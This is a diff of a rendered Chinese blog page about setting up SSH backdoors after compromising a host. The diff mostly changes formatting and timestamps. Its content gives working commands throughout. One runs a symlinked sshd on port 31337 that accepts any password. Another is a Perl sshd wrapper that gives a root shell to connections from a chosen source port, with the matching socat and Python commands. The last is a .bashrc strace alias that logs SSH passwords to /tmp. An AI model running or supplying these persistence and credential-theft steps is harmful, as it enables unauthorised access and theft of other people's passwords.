@@ -86,17 +86,17 @@
 
 
 
-<meta name="description" content="1.入侵得到SHELL后，对方防火墙没限制，想快速开放一个可以访问的SSH端口肉鸡上执行 ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337;就会派生一个31337端口，然后连接31337，用root/bin/ftp/mail当用户名，密码随意，就可登陆。 2.做一个SSH wrapper后门，效果比第一个好，没有开放额外的端口，只要对方开了SSH">
+<meta name="description" content="1.入侵得到SHELL后，对方防火墙没限制，想快速开放一个可以访问的SSH端口肉鸡上执行  ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337;就会派生一个31337端口，然后连接31337，用root/bin/ftp/mail当用户名，密码随意，就可登陆。  2.做一个SSH wrapper后门，效果比第一个好，没有开放额外的端口，只要对方开了">
 <meta property="og:type" content="article">
 <meta property="og:title" content="渗透过程中的SSH(后门建立)">
 <meta property="og:url" content="http://MaiKeFee.com/archives/21b719d6.html">
 <meta property="og:site_name" content="MaiKeFee|一个兴趣使然的信息安全爱好者">
-<meta property="og:description" content="1.入侵得到SHELL后，对方防火墙没限制，想快速开放一个可以访问的SSH端口肉鸡上执行 ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337;就会派生一个31337端口，然后连接31337，用root/bin/ftp/mail当用户名，密码随意，就可登陆。 2.做一个SSH wrapper后门，效果比第一个好，没有开放额外的端口，只要对方开了SSH">
+<meta property="og:description" content="1.入侵得到SHELL后，对方防火墙没限制，想快速开放一个可以访问的SSH端口肉鸡上执行  ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337;就会派生一个31337端口，然后连接31337，用root/bin/ftp/mail当用户名，密码随意，就可登陆。  2.做一个SSH wrapper后门，效果比第一个好，没有开放额外的端口，只要对方开了">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-08-27T15:14:42.266Z">
+<meta property="og:updated_time" content="2019-08-28T08:45:07.873Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="渗透过程中的SSH(后门建立)">
-<meta name="twitter:description" content="1.入侵得到SHELL后，对方防火墙没限制，想快速开放一个可以访问的SSH端口肉鸡上执行 ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337;就会派生一个31337端口，然后连接31337，用root/bin/ftp/mail当用户名，密码随意，就可登陆。 2.做一个SSH wrapper后门，效果比第一个好，没有开放额外的端口，只要对方开了SSH">
+<meta name="twitter:description" content="1.入侵得到SHELL后，对方防火墙没限制，想快速开放一个可以访问的SSH端口肉鸡上执行  ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337;就会派生一个31337端口，然后连接31337，用root/bin/ftp/mail当用户名，密码随意，就可登陆。  2.做一个SSH wrapper后门，效果比第一个好，没有开放额外的端口，只要对方开了">
 
 
 
@@ -357,8 +357,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-08-27T23:14:42+08:00">
-                2019-08-27
+              <time title="更新于" itemprop="dateModified" datetime="2019-08-28T16:45:07+08:00">
+                2019-08-28
               </time>
             
           </span>
@@ -402,7 +402,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  382
+                  384
                 </span>
               
 
@@ -439,29 +439,41 @@
       
 
       
-        <p>1.入侵得到SHELL后，对方防火墙没限制，想快速开放一个可以访问的SSH端口<br>肉鸡上执行</p>
+        <blockquote>
+<p>1.入侵得到SHELL后，对方防火墙没限制，想快速开放一个可以访问的SSH端口<br>肉鸡上执行</p>
+</blockquote>
 <pre><code>ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337;</code></pre><p>就会派生一个31337端口，然后连接31337，用root/bin/ftp/mail当用户名，密码随意，就可登陆。</p>
+<blockquote>
 <p>2.做一个SSH wrapper后门，效果比第一个好，没有开放额外的端口，只要对方开了SSH服务，就能远程连接<br>在肉鸡上执行：</p>
+</blockquote>
 <pre><code>[root@localhost ~]# cd /usr/sbin
 [root@localhost sbin]# mv sshd ../bin
 [root@localhost sbin]# echo &apos;#!/usr/bin/perl&apos; &gt;sshd
 [root@localhost sbin]# echo &apos;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);&apos; &gt;&gt;sshd
 [root@localhost sbin]# echo &apos;exec {&quot;/usr/bin/sshd&quot;} &quot;/usr/sbin/sshd&quot;,@ARGV,&apos; &gt;&gt;sshd
 [root@localhost sbin]# chmod u+x sshd
-[root@localhost sbin]# /etc/init.d/sshd restart</code></pre><p>在本机执行：</p>
-<pre><code>socat STDIO TCP4:10.18.180.20:22,sourceport=13377</code></pre><p>如果你想修改源端口，可以用python的struct标准库实现</p>
+[root@localhost sbin]# /etc/init.d/sshd restart</code></pre><blockquote>
+<p>在本机执行：</p>
+</blockquote>
+<pre><code>socat STDIO TCP4:10.18.180.20:22,sourceport=13377</code></pre><blockquote>
+<blockquote>
+<p>如果你想修改源端口，可以用python的struct标准库实现</p>
+</blockquote>
+</blockquote>
 <pre><code>&gt;&gt;&gt; import struct
 &gt;&gt;&gt; buffer = struct.pack(&apos;&gt;I6&apos;,19526)
 &gt;&gt;&gt; print repr(buffer)
 &apos;\x00\x00LF&apos;
 &gt;&gt;&gt; buffer = struct.pack(&apos;&gt;I6&apos;,13377)
 &gt;&gt;&gt; print buffer</code></pre><p>4A</p>
+<blockquote>
 <ol start="3">
-<li><p>记录SSH客户端连接密码<br>搞定主机后，往往想记录肉鸡SSH连接到其他主机的密码，进一步扩大战果，使用strace命令就行了。<br>在肉鸡上修改要记录密码用户目录的.bashrc，添加一行:</p>
-<p> alias ssh=’strace -o /tmp/.sshpwd-<code>date &#39;+%d%h%m%s&#39;</code>.log -e read.write.connect -s 2048 ssh’</p>
-</li>
+<li>记录SSH客户端连接密码<br>搞定主机后，往往想记录肉鸡SSH连接到其他主机的密码，进一步扩大战果，使用strace命令就行了。<br>在肉鸡上修改要记录密码用户目录的.bashrc，添加一行:</li>
 </ol>
+</blockquote>
+<pre><code>alias ssh=&apos;strace -o /tmp/.sshpwd-`date &apos;+%d%h%m%s&apos;`.log -e read.write.connect -s 2048 ssh&apos;</code></pre><blockquote>
 <p>之后查看tmp目录的记录：</p>
+</blockquote>
 <pre><code>grep &quot;read(5&quot; /tmp/.sshpwdxxxxxxxx.log</code></pre>
       
     </div>
